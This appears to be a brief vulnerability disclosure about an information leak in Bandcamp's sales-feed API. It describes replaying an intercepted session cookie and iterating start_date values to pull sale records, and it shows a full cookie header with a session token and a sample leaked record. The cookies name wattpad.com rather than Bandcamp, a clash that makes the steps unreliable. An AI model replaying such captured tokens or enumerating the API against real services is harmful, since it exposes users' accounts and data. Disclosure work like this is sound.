# About Bandcamp Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: wp_id=d009d7cb-9041-46a2-a004-826cff01b7aa; lang=1; _ga=GA1.1.500116561.1711539863; _fbp=fb.1.1711539863586.1786727445; _pbjs_userid_consent_data=3524755945110770; _sharedid=014ee592-f8dd-4993-9741-7f62da71246c; g_state={"i_p":1711547080940,"i_l":1}; fbm_2582347323=base_domain=.wattpad.com; locale=en_US; token=462965140%3A2%3A1711540226%3AqEeVSRSqDk_yvPXvHza9uN6vVIzhpiObJWVy14c87omxtPE1FmQRnwruVFKFzezR; ff=1; dpr=1; tz=-8; X-Time-Zone=Asia%2FShanghai; hc=2024-03-27T11%3A50%3A28.645Z; seen-wallet-onboard=1; isStaff=1; _ga_FNDTZ0MZDQ=GS1.1.1712101115.3.0.1712101115.0.0.0; te_session_id=1712101115137; RT=nu=https%3A%2F%2Fwww.wattpad.com%2Fuser%2FShionYg&cl=1712101219873
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: Authhor name,Price,Buyer'Country.

> Request method: GET, information can be obtained by traversing the constructed start_date, such as "1712112120", "1707725640"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|--------------|---|------------|
| Yizhimuzhu666|https://bandcamp.com/api/salesfeed/1/get?start_date=1712112120|start_date=1712112120|



### Leaked packet cases 
``` 
{
            "event_type": "sale",
            "utc_date": 1712112842.1493337,
            "items": [
                {
                    "utc_date": 1712112842.2647789,
                    "artist_name": "Mors Vitaque",
                    "item_type": "p",
                    "item_description": "Special Edition Cassette",
                    "album_title": "Another Path",
                    "slug_type": "a",
                    "track_album_slug_text": null,
                    "currency": "USD",
                    "amount_paid": 15,
                    "item_price": 15,
                    "amount_paid_usd": 15,
                    "country": "******",
                    "art_id": null,
                    "releases": null,
                    "package_image_id": 35581169,
                    "url": "//morsvitaque.bandcamp.com/album/another-path",
                    "country_code": "**",
                    "amount_paid_fmt": "$15",
                    "art_url": "https://f4.bcbits.com/img/0035581169_37.jpg"
                }
            ]
        }
```